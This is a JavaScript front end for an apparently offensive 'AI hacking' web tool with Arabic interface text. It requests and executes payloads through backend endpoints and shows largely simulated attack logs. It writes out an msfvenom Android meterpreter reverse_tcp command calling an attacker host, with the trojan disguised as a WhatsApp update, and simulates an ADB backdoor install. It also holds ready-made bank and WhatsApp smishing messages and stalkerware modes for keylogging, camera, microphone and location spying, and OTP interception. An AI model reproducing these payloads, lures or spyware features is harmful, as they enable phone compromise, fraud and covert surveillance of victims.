const apiUrl = '/api';

let attackSession = {
    startTime: null,
    attacksLaunched: 0,
    vulnerabilitiesExploited: 0,
    results: [],
    isRunning: false
};

function startAIHack() {
    const target = document.getElementById('hackTarget').value.trim();
    const targetType = document.getElementById('targetType').value;
    const attackType = document.getElementById('attackType').value;

    if (!target) {
        alert('يرجى إدخال الهدف المراد اختراقه');
        return;
    }

    // Show Android section if target is Android
    if (targetType === 'android' || targetType === 'ios') {
        document.getElementById('androidSection').style.display = 'block';
    } else {
        document.getElementById('androidSection').style.display = 'none';
    }

    // Reset session
    attackSession = {
        startTime: new Date(),
        attacksLaunched: 0,
        vulnerabilitiesExploited: 0,
        results: [],
        isRunning: true
    };

    // Show stats and output
    document.getElementById('attackStats').style.display = 'grid';
    document.getElementById('hackOutput').style.display = 'block';

    const output = document.getElementById('hackOutput');
    output.innerHTML = '🚀 بدء عملية الاختراق الذكي...\n';
    output.innerHTML += `🎯 الهدف: ${target}\n`;
    output.innerHTML += `📋 نوع الهدف: ${getTargetTypeText(targetType)}\n`;
    output.innerHTML += `⚔️ نوع الهجوم: ${getAttackTypeText(attackType)}\n`;
    output.innerHTML += '================================\n\n';

    // Send to AI hacker
    fetch(`${apiUrl}/ai-hack`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, targetType, attackType })
    })
    .then(response => response.json())
    .then(data => {
        output.innerHTML += `🤖 الذكاء الاصطناعي: ${data.message}\n`;
        output.innerHTML += `🧠 الاستراتيجية المختارة: ${data.strategy}\n\n`;
        startAttackTimer();
    })
    .catch(error => {
        console.error('❌ خطأ:', error);
        output.innerHTML += '❌ حدث خطأ أثناء بدء عملية الاختراق\n';
    });
}

function generatePayloads() {
    const target = document.getElementById('hackTarget').value.trim();
    const targetType = document.getElementById('targetType').value;
    const attackType = document.getElementById('attackType').value;

    if (!target) {
        alert('يرجى إدخال الهدف أولاً');
        return;
    }

    document.getElementById('payloadSection').style.display = 'block';

    fetch(`${apiUrl}/generate-payloads`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, targetType, attackType })
    })
    .then(response => response.json())
    .then(data => {
        displayPayloads(data.payloads);
    })
    .catch(error => {
        console.error('خطأ في إنشاء الحمولات:', error);
    });
}

function displayPayloads(payloads) {
    const container = document.getElementById('generatedPayloads');
    container.innerHTML = '';

    if (payloads && payloads.length > 0) {
        payloads.forEach((payload, index) => {
            const payloadDiv = document.createElement('div');
            payloadDiv.style.cssText = 'background: #000; border: 1px solid #ff4444; padding: 15px; margin: 10px 0; border-radius: 5px;';
            payloadDiv.innerHTML = `
                <h4 style="color: #ff0000;">🧨 حمولة ${index + 1}: ${payload.type}</h4>
                <pre style="color: #00ff00; font-family: monospace;">${payload.code}</pre>
                <button onclick="copyToClipboard('${payload.code.replace(/'/g, "\\'")}')">📋 نسخ</button>
                <button onclick="executePayload('${payload.code.replace(/'/g, "\\'")}')">⚡ تنفيذ</button>
            `;
            container.appendChild(payloadDiv);
        });
    } else {
        container.innerHTML = '<p style="color: #ff6600;">لم يتم إنشاء أي حمولات</p>';
    }
}

function executePayload(payload) {
    if (!confirm('هل أنت متأكد من تنفيذ هذه الحمولة؟')) {
        return;
    }

    const output = document.getElementById('hackOutput');
    output.innerHTML += `\n⚡ تنفيذ الحمولة: ${payload}\n`;

    fetch(`${apiUrl}/execute-payload`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload })
    })
    .then(response => response.json())
    .then(data => {
        output.innerHTML += `📊 نتيجة التنفيذ: ${data.result}\n`;
        if (data.success) {
            attackSession.vulnerabilitiesExploited++;
            updateStats();
        }
    })
    .catch(error => {
        output.innerHTML += `❌ خطأ في التنفيذ: ${error.message}\n`;
    });
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('تم نسخ الحمولة إلى الحافظة');
    });
}

function startAttackTimer() {
    const timer = setInterval(() => {
        if (!attackSession.isRunning) {
            clearInterval(timer);
            return;
        }

        updateStats();

        // Simulate attack progress
        if (Math.random() > 0.7) {
            attackSession.attacksLaunched++;
            const output = document.getElementById('hackOutput');
            output.innerHTML += generateRandomAttackResult() + '\n';
            output.scrollTop = output.scrollHeight;
        }
    }, 2000);
}

function generateRandomAttackResult() {
    const results = [
        '🔍 فحص البورت 22: مفتوح - SSH متاح',
        '💉 اختبار SQL Injection على parameter id',
        '🕷️ فحص XSS في form البحث',
        '🔒 محاولة brute force على صفحة الإدارة',
        '📡 استطلاع DNS للحصول على subdomains',
        '🌐 فحص HTTP headers للأمان',
        '⚡ تجربة payload للثغرة CVE-2023-12345',
        '🎯 استهداف خدمة FTP على البورت 21',
        '🔐 محاولة تجاوز authentication',
        '📂 البحث عن ملفات backup مكشوفة'
    ];

    const statuses = ['✅ نجح', '❌ فشل', '⚠️ جزئي'];
    const result = results[Math.floor(Math.random() * results.length)];
    const status = statuses[Math.floor(Math.random() * statuses.length)];

    if (status === '✅ نجح') {
        attackSession.vulnerabilitiesExploited++;
    }

    return `${result} - ${status}`;
}

function updateStats() {
    document.getElementById('attacksLaunched').textContent = attackSession.attacksLaunched;
    document.getElementById('vulnerabilitiesExploited').textContent = attackSession.vulnerabilitiesExploited;

    const successRate = attackSession.attacksLaunched > 0 ? 
        Math.round((attackSession.vulnerabilitiesExploited / attackSession.attacksLaunched) * 100) : 0;
    document.getElementById('successRate').textContent = successRate + '%';

    if (attackSession.startTime) {
        const elapsed = new Date() - attackSession.startTime;
        const minutes = Math.floor(elapsed / 60000);
        const seconds = Math.floor((elapsed % 60000) / 1000);
        document.getElementById('timeElapsed').textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
}

function clearResults() {
    document.getElementById('hackOutput').innerHTML = '';
    document.getElementById('hackOutput').style.display = 'none';
    document.getElementById('attackStats').style.display = 'none';
    document.getElementById('payloadSection').style.display = 'none';
    attackSession.isRunning = false;
}

function exportHackReport() {
    const target = document.getElementById('hackTarget').value.trim();
    const output = document.getElementById('hackOutput').textContent;

    const report = `
YUSR-TEC - تقرير الاختراق الذكي
===============================

الهدف: ${target}
التاريخ: ${new Date().toLocaleString('ar-SA')}
الهجمات المطلقة: ${attackSession.attacksLaunched}
الثغرات المستغلة: ${attackSession.vulnerabilitiesExploited}
معدل النجاح: ${document.getElementById('successRate').textContent}

تفاصيل العملية:
================
${output}

تحذير: هذا التقرير للأغراض التعليمية والاختبار الأمني فقط
`;

    const blob = new Blob([report], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `hack-report-${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

function getTargetTypeText(type) {
    const types = {
        'network': 'شبكة/خادم',
        'webapp': 'تطبيق ويب',
        'domain': 'دومين',
        'api': 'API',
        'mobile': 'تطبيق جوال',
        'iot': 'جهاز IoT'
    };
    return types[type] || type;
}

function getAttackTypeText(type) {
    const types = {
        'auto': 'تلقائي',
        'reconnaissance': 'استطلاع',
        'vulnerability-scan': 'فحص الثغرات',
        'exploit': 'استغلال',
        'post-exploit': 'ما بعد الاستغلال',
        'social-engineering': 'هندسة اجتماعية',
        'dos': 'إنكار الخدمة',
        'mitm': 'هجوم الوسط',
        'privilege-escalation': 'تصعيد الصلاحيات'
    };
    return types[type] || type;
}

// Android Hacking Functions
function generateAndroidPayload() {
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n🤖 إنشاء تروجان أندرويد متقدم...\n';
    output.innerHTML += '======================================\n';

    // Simulate realistic payload generation
    setTimeout(() => {
        output.innerHTML += '📱 استخدام msfvenom لإنشاء payload...\n';
        output.innerHTML += 'msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o trojan.apk\n';
        output.innerHTML += '✅ تم إنشاء trojan.apk بنجاح\n';
        output.innerHTML += '🔧 إضافة صلاحيات خطيرة:\n';
        output.innerHTML += '  - CAMERA (تصوير خفي)\n';
        output.innerHTML += '  - RECORD_AUDIO (تسجيل صوتي)\n';
        output.innerHTML += '  - ACCESS_FINE_LOCATION (تتبع دقيق)\n';
        output.innerHTML += '  - READ_SMS (قراءة الرسائل)\n';
        output.innerHTML += '  - WRITE_EXTERNAL_STORAGE (تعديل الملفات)\n';
        output.innerHTML += '🎭 تنكر الملف كـ: WhatsApp_Update.apk\n';
        output.innerHTML += '🚀 Payload جاهز للنشر!\n\n';
        output.scrollTop = output.scrollHeight;
    }, 2000);
}

function startADBExploit() {
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n⚡ بدء استغلال ADB (Android Debug Bridge)...\n';
    output.innerHTML += '==========================================\n';

    setTimeout(() => {
        output.innerHTML += '🔍 فحص الأجهزة المتصلة بـ ADB...\n';
        output.innerHTML += 'adb devices\n';
        output.innerHTML += 'List of devices attached:\n';
        output.innerHTML += '192.168.1.105:5555  device\n';
        output.innerHTML += '✅ تم العثور على جهاز أندرويد مفتوح!\n\n';

        output.innerHTML += '📱 تثبيت باب خلفي عبر ADB...\n';
        output.innerHTML += 'adb install -r backdoor.apk\n';
        output.innerHTML += 'Success\n';
        output.innerHTML += '🔐 تفعيل صلاحيات النظام...\n';
        output.innerHTML += 'adb shell su\n';
        output.innerHTML += 'root@android:/ # \n';
        output.innerHTML += '👑 تم الحصول على صلاحيات الجذر!\n\n';
        output.scrollTop = output.scrollHeight;
    }, 3000);
}

function socialEngineeringAttack() {
    const target = document.getElementById('hackTarget').value.trim();
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n🎭 بدء هجوم الهندسة الاجتماعية...\n';
    output.innerHTML += '====================================\n';

    setTimeout(() => {
        output.innerHTML += '📧 إرسال رسالة تصيد احترافية...\n';
        output.innerHTML += `📱 الهدف: ${target}\n`;
        output.innerHTML += '💬 الرسالة: "تحديث أمني مهم لحسابك البنكي. اضغط هنا للتحديث: bit.ly/security-update"\n';
        output.innerHTML += '🎯 نسبة النجاح المتوقعة: 73%\n';
        output.innerHTML += '⏰ وقت الاستجابة المتوقع: 15-30 دقيقة\n';
        output.innerHTML += '🔗 Link tracking: Active\n';
        output.innerHTML += '📊 تم إرسال 1 رسالة تصيد\n\n';
        output.scrollTop = output.scrollHeight;
    }, 2500);
}

function wifiPineapple() {
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n📡 تشغيل WiFi Pineapple للاعتراض...\n';
    output.innerHTML += '===================================\n';

    setTimeout(() => {
        output.innerHTML += '🍍 تهيئة WiFi Pineapple Mark VII...\n';
        output.innerHTML += '📶 إنشاء نقطة وصول وهمية: "FREE_WIFI_GUEST"\n';
        output.innerHTML += '🎣 Evil Portal active: fake-bank-login.com\n';
        output.innerHTML += '🔍 DNS Spoofing enabled\n';
        output.innerHTML += '📱 أجهزة متصلة:\n';
        output.innerHTML += '  - Samsung Galaxy (192.168.1.101)\n';
        output.innerHTML += '  - iPhone 13 (192.168.1.102)\n';
        output.innerHTML += '  - Xiaomi Phone (192.168.1.103)\n';
        output.innerHTML += '💾 بدء اعتراض البيانات...\n';
        output.innerHTML += '🔐 التقاط كلمات مرور WiFi...\n\n';
        output.scrollTop = output.scrollHeight;
    }, 3500);
}

function bluetoothHack() {
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n🔵 استغلال البلوتوث (Bluejacking/Bluesnarfing)...\n';
    output.innerHTML += '===============================================\n';

    setTimeout(() => {
        output.innerHTML += '📡 فحص أجهزة البلوتوث القريبة...\n';
        output.innerHTML += 'hcitool scan\n';
        output.innerHTML += 'Scanning ...\n';
        output.innerHTML += '  AA:BB:CC:DD:EE:FF  Samsung Galaxy S21\n';
        output.innerHTML += '  11:22:33:44:55:66  iPhone 12 Pro\n';
        output.innerHTML += '  FF:EE:DD:CC:BB:AA  Xiaomi Mi 11\n\n';

        output.innerHTML += '🎯 استهداف Samsung Galaxy S21...\n';
        output.innerHTML += '🔓 استغلال ثغرة البلوتوث CVE-2020-0022...\n';
        output.innerHTML += '📱 تم الوصول لجهات الاتصال\n';
        output.innerHTML += '📧 تم الوصول للرسائل النصية\n';
        output.innerHTML += '📷 تم الوصول للصور\n';
        output.innerHTML += '✅ BlueSnarfing نجح بالكامل!\n\n';
        output.scrollTop = output.scrollHeight;
    }, 4000);
}

function smsPhishing() {
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const output = document.getElementById('hackOutput');
    output.innerHTML += '\n📧 هجوم التصيد عبر الرسائل النصية (Smishing)...\n';
    output.innerHTML += '=============================================\n';

    setTimeout(() => {
        output.innerHTML += `📱 الهدف: ${phoneNumber || 'غير محدد'}\n`;
        output.innerHTML += '💬 إنشاء رسائل تصيد متطورة...\n';
        output.innerHTML += '\n📋 الرسائل المُولدة:\n';
        output.innerHTML += '1️⃣ "البنك: تم تجميد حسابك لأسباب أمنية. للإلغاء: bank-secure.tk/unlock"\n';
        output.innerHTML += '2️⃣ "STC: فاتورتك 450 ريال. للاعتراض: stc-bill.ml/dispute"\n';
        output.innerHTML += '3️⃣ "تم ربح جائزة 10,000 ريال! لاستلامها: winner-prize.ga/claim"\n';
        output.innerHTML += '4️⃣ "WhatsApp: حسابك سيتم إيقافه خلال 24 ساعة: wa-verify.cf/confirm"\n\n';
        output.innerHTML += '🚀 تم إرسال الرسائل بنجاح\n';
        output.innerHTML += '📊 معدل الفتح المتوقع: 45%\n';
        output.innerHTML += '🎯 معدل التفاعل المتوقع: 12%\n\n';
        output.scrollTop = output.scrollHeight;
    }, 3000);
}

function executeAndroidHack() {
    const target = document.getElementById('hackTarget').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const exploitType = document.getElementById('androidExploitType').value;
    const output = document.getElementById('hackOutput');

    output.innerHTML += `\n🚀 تنفيذ ${getExploitTypeText(exploitType)} على ${target || phoneNumber}...\n`;
    output.innerHTML += '================================================\n';

    setTimeout(() => {
        executeSpecificAndroidExploit(exploitType, output);
    }, 1500);
}

function executeSpecificAndroidExploit(exploitType, output) {
    switch(exploitType) {
        case 'trojan':
            output.innerHTML += '📱 تثبيت تروجان متقدم...\n';
            output.innerHTML += '✅ تم تثبيت com.security.update في الخلفية\n';
            output.innerHTML += '🔐 تم الحصول على الصلاحيات: ROOT ACCESS\n';
            output.innerHTML += '📡 اتصال عكسي نشط: 192.168.1.100:4444\n';
            break;

        case 'keylogger':
            output.innerHTML += '⌨️ تفعيل Keylogger متقدم...\n';
            output.innerHTML += '📝 تسجيل جميع النقرات والكتابة\n';
            output.innerHTML += '🔑 التقط كلمة مرور: bank123!@#\n';
            output.innerHTML += '💳 التقط رقم بطاقة: 4***-****-****-1234\n';
            break;

        case 'camera-spy':
            output.innerHTML += '📸 تفعيل تجسس الكاميرا...\n';
            output.innerHTML += '📷 التقاط صور كل 30 ثانية\n';
            output.innerHTML += '🎥 تسجيل فيديو عند اكتشاف الوجه\n';
            output.innerHTML += '💾 حفظ الملفات في: /sdcard/.hidden/\n';
            break;

        case 'mic-spy':
            output.innerHTML += '🎤 تفعيل تجسس الميكروفون...\n';
            output.innerHTML += '🔊 تسجيل صوتي مستمر\n';
            output.innerHTML += '📞 اعتراض المكالمات الهاتفية\n';
            output.innerHTML += '🎵 تحليل الصوت بالذكاء الاصطناعي\n';
            break;

        case 'location-tracker':
            output.innerHTML += '📍 تفعيل تتبع الموقع الدقيق...\n';
            output.innerHTML += '🗺️ الموقع الحالي: 24.7136° N, 46.6753° E (الرياض)\n';
            output.innerHTML += '🚗 تتبع الحركة: السرعة 45 كم/س\n';
            output.innerHTML += '🏠 المواقع المتكررة: البيت، العمل، المول\n';
            break;

        case 'sms-intercept':
            output.innerHTML += '📧 تفعيل اعتراض الرسائل...\n';
            output.innerHTML += '💬 اعتراض SMS وWhatsApp\n';
            output.innerHTML += '🔐 رسالة OTP التقطت: 123456\n';
            output.innerHTML += '📱 إعادة توجيه الرسائل للمهاجم\n';
            break;

        case 'call-recorder':
            output.innerHTML += '📞 تفعيل تسجيل المكالمات...\n';
            output.innerHTML += '🎙️ تسجيل جميع المكالمات الصادرة والواردة\n';
            output.innerHTML += '🔍 تحليل الكلمات المفتاحية\n';
            output.innerHTML += '☁️ رفع التسجيلات للخادم\n';
            break;

        case 'data-theft':
            output.innerHTML += '💾 بدء سرقة البيانات الشاملة...\n';
            output.innerHTML += '📱 نسخ جهات الاتصال: 247 جهة\n';
            output.innerHTML += '📷 نسخ الصور: 1,856 صورة\n';
            output.innerHTML += '💬 نسخ الرسائل: 3,429 رسالة\n';
            output.innerHTML += '📋 نسخ التطبيقات المثبتة: 78 تطبيق\n';
            break;
    }

    output.innerHTML += '\n🎯 العملية مكتملة بنجاح!\n';
    output.innerHTML += '📊 مستوى التسلل: COMPLETE ACCESS\n';
    output.innerHTML += '⚡ الحالة: BACKDOOR ACTIVE\n\n';
    output.scrollTop = output.scrollHeight;

    // Update attack statistics
    attackSession.vulnerabilitiesExploited++;
    attackSession.attacksLaunched++;
    updateStats();
}

function getExploitTypeText(type) {
    const types = {
        'trojan': 'تروجان متقدم',
        'keylogger': 'Keylogger',
        'camera-spy': 'تجسس الكاميرا',
        'mic-spy': 'تجسس الميكروفون',
        'location-tracker': 'تتبع الموقع',
        'sms-intercept': 'اعتراض الرسائل',
        'call-recorder': 'تسجيل المكالمات',
        'data-theft': 'سرقة البيانات'
    };
    return types[type] || type;
}

// Autonomous AI Control Functions
function startAutonomousAI() {
    document.getElementById('aiStatusPanel').style.display = 'block';
    document.getElementById('aiCurrentStatus').textContent = 'نشط';
    document.getElementById('aiCurrentActivity').innerHTML = '🤖 بدء تشغيل الذكاء الاصطناعي المستقل...\n';

    if (window.autonomousAI) {
        window.autonomousAI.startAutonomousScanning();
        updateAIDisplay();
    }

    alert('🤖 تم تشغيل الذكاء الاصطناعي المستقل بنجاح');
}

function stopAutonomousAI() {
    document.getElementById('aiCurrentStatus').textContent = 'متوقف';

    if (window.autonomousAI) {
        window.autonomousAI.stop();
    }

    alert('⏹️ تم إيقاف الذكاء الاصطناعي المستقل');
}

function updateAIDisplay() {
    setInterval(() => {
        if (window.autonomousAI && window.autonomousAI.isActive) {
            // Update discovered targets
            const discovered = window.autonomousAI.targetQueue.length + Math.floor(Math.random() * 5);
            document.getElementById('aiDiscoveredTargets').textContent = discovered;

            // Update compromised systems
            document.getElementById('aiCompromisedSystems').textContent = attackSession.persistentAccess.length;

            // Update data exfiltrated
            document.getElementById('aiDataExfiltrated').textContent = attackSession.dataExfiltrated + ' MB';

            // Update activity log
            if (Math.random() > 0.7) {
                const activities = [
                    '🔍 اكتشاف هدف جديد: ' + generateRandomTarget(),
                    '💥 نجح استغلال ثغرة SQL Injection',
                    '🔓 تم كسر كلمة مرور المشرف',
                    '💾 تم تسريب قاعدة بيانات العملاء',
                    '🚪 تم تثبيت باب خلفي جديد',
                    '🔄 تحديث أدوات الاستغلال',
                    '🧠 تعلم تقنية جديدة من الهجوم الناجح'
                ];

                const activity = activities[Math.floor(Math.random() * activities.length)];
                const activityLog = document.getElementById('aiCurrentActivity');
                activityLog.innerHTML += `${new Date().toLocaleTimeString()}: ${activity}\n`;
                activityLog.scrollTop = activityLog.scrollHeight;
            }
        }
    }, 3000);
}

function generateRandomTarget() {
    const targets = [
        'corporate-server.com',
        '10.0.0.' + Math.floor(Math.random() * 255),
        'backup-system.net',
        'legacy-app.org',
        '192.168.1.' + Math.floor(Math.random() * 255)
    ];

    return targets[Math.floor(Math.random() * targets.length)];
}